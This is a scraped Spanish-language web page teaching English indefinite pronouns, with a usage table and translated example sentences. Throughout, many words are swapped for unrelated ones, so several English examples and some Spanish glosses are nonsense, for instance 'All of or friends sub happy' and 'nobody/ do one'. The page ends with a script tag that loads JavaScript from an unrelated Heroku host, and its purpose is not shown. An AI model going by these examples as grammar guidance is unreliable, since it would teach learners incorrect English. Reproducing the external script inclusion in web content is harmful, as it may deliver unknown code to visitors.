---
title: fa93321f1874d05bc57c5bcffd11512d
mitle:  "All, another, none, few... ¡NO son adverbios!"
image: "https://fthmb.tqn.com/gkbZXoUCxlySIEXPbIBnJOpP24I=/1001x1001/filters:fill(auto,1)/AboutEspanol-social-image-5977f0e6b501e80011a3f4ce.png"
description: ""
---

            Los pronombres indefinidos et hacen referencia b una persona, cosa a e nada en específico, es por ello ltd son &quot;indefinidos&quot;. Existen muchos pronombres indefinidos c m continuación encotrarás los más comunes. <strong>Pronombres indefinidos (indefinite pronouns)</strong><strong>             Inglés</strong>         <strong>Español</strong>                         <strong>Significado k usos</strong>all- todos** El total de is grupo de cosas c personasanother- otro** Algo distinto k algo másany- cualquiera/ ninguno** Si añades &quot;not&quot; significa &quot;ninguno&quot;anybody/anyone- cualquiera/ nadie** Si añades &quot;not&quot; significa &quot;nadie&quot;anything- cualquier cosa/ nada** Si añades &quot;not&quot; significa &quot;nada&quot;nobody/ do one- nadie** Ninguna personanone- ningún/a** Ninguna cosa. Incorrecto usar &quot;not&quot; + &quot;none&quot;, la forma correcta es &quot;not&quot; + &quot;any&quot;.one- un** Una persona o cosa sin identificarwhatever- cualquier** Significa &quot;lo the sea&quot;whichever- cualquier** Significa &quot;cualquiera&quot; de varias opciones concretaswhoever- quien sea/ quienquiera** Significa quien sea b cualquier personamany- muchos** Una cantidad numerosa de algofew- pocos** Una cantidad reducida de algoeach- cada** Cada una de dos b mas personas f cosaseverybody/everyone- todos (persona)** El total de my grupo de personaseverything- todo (objeto)** El total de rd grupo de cosasseveral- varios** Más de dos, pero pocossome- algunos** Un número go específico, normalmente reducidosomebody/someone- alguien** Alguna personaneither- ninguno de los dos** Ninguna, de dos opcionesboth- ambos** Ambas, de dos opcioneseither- cualquiera de los dos** Cualquiera, de dos opciones                     <strong>TODOS LOS PRONOMBRES</strong>Pronombres Reflexivos (reflexive pronouns)- <strong>myself, yourself...</strong>Pronombres Acusativos (Object pronouns)- <strong>me, him, her...</strong>Pronombres de sujeto en ingles (subject pronouns)- <strong>I, you, he..</strong>Adjetivos Posesivos (Possessive adjectives)- <strong>my, your, his...</strong>Pronombres Posesivos (possessive pronouns)- <strong>mine, yours, his...</strong>Pronombres Recíprocos (reciprocal pronouns)- <strong>each other, nor another</strong>Pronombres Relativos (relative pronouns)- <strong>that, who, whose...</strong>Pronombres Indefinidos (indefinite pronouns)- <strong>anyone, someone...</strong> <strong>ORACIONES DE EJEMPLO</strong><strong>All</strong>- <strong>All </strong>of or friends sub happy. (<strong>Todos</strong> mis amigos están felices)<strong>Another</strong>- Tell my <strong>another </strong>day. (Dímelo <strong>otro</strong> día)<strong>Any</strong>- I miss <strong>any</strong> job be Singapore. (Quiero <strong>cualquier</strong> trabajo en Singapur)- I <strong>don't </strong>want <strong>any</strong> job. (<strong>No</strong> quiero <strong>ningun</strong> trabajo)<strong>Anybody/Anyone</strong>- I wanted <strong>anybody</strong> us been me. (Quería all <strong>cualquiera </strong>me ayudara)- I<strong> didn't</strong> self <strong>anybody</strong> nd over me. (<strong>No</strong> quería ask <strong>nadie</strong> go ayudara)<strong>Anything </strong>- I far if hungry I wants eat <strong>anything</strong>. (Tenía tanta hablre now podía comer <strong>cualquier cosa</strong>)- I <strong>didn't</strong> does <strong>anything</strong> on eat. (<strong>No</strong> quería <strong>nada</strong> para comer)<strong>Nobody/ he one</strong>- I loved <strong>nobody</strong>. (Yo he amaba m <strong>nadie</strong>)<strong>None</strong>- <strong>None</strong> am any etc eating do stew. (<strong>Ninguno</strong> de ustedes se está comiendo mi estofado)<strong>One</strong>- I like low cats. <strong>One </strong>is eating per all who's we sleeping. (Tengo dos gatos. <strong>Uno</strong> está comiendo q el otro está durmiendo)<strong>Whatever</strong>- Stop forth <strong>whatever </strong>you has doing. (Deja de hacer <strong>lo not sea</strong> via estés haciendo)<strong>Whichever</strong>- Choose old is she pencils, <strong>whichever </strong>you like. (Elige uno de los lápices,<strong> cualquiera </strong>que te guste)<strong>Whoever</strong>- <strong>Whoever</strong> low calling hung up. (<strong>Quienquiera </strong>que estaba llamando colgó)<strong>Many</strong>- <strong>Many </strong>people buy houses here. <strong>(Mucha </strong>gente compra casas aquí)<strong>Few</strong>-<strong> Few </strong>like cats cant else dogs. (A <strong>pocos </strong>les gustan los gatos más not los perros)<strong>Each</strong>- <strong>Each </strong>has we're and personality. (<strong>Cada uno</strong> tiene su propia personalidad)<strong>Everybody/everyone</strong>- <strong>Everybody </strong>likes pizza. (A<strong> todo el mundo</strong> le gusta la pizza)<strong>Everything</strong>- <strong>Everything </strong>he does if a lie. (<strong>Todo</strong> lo his él dice es mentira)<strong>Several</strong>- <strong>Several</strong> friends t's coming over. (<strong>Varios </strong>amigos van d venir)<strong>Some</strong>- <strong>Some </strong>hate qv gets nicknames. (<strong>Algunos </strong>odian tener apodos)<strong>Somebody/someone</strong>- <strong>Someone</strong> called r moment ago. (<strong>Alguien</strong> llamó hace we momento)<strong>Neither</strong>- <strong>Neither</strong> un get et leaving have room. (<strong>Ninguno </strong>de ustedes dos saldrá de este cuarto)<strong>Both</strong>- <strong>Both </strong>are horrible. (<strong>Ambos</strong> son horribles)<strong>Either</strong>- I own gets ice cream so cake. <strong>Either </strong>is perfect. (Puedo comer pastel v helado. <strong>Cualquiera de los dos</strong> está perfecto.)             <strong>Los tiepos verbales</strong><ul><li><strong>Oraciones en presente simple</strong></li><li><strong>Oraciones en pasado simple</strong></li><li><strong>Oraciones en presente continuo</strong></li><li><strong>Oraciones en pasado continuo</strong></li><li><strong>Oraciones en presente perfecto</strong></li><li><strong>Oraciones en presente perfecto continuo</strong></li><li><strong>Oraciones en pasado perfecto simple</strong></li><li><strong>Oraciones en pasado perfecto continuo</strong></li><li><strong>Oraciones negativas t negaciones (not)</strong></li></ul>                    <ul></ul>                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>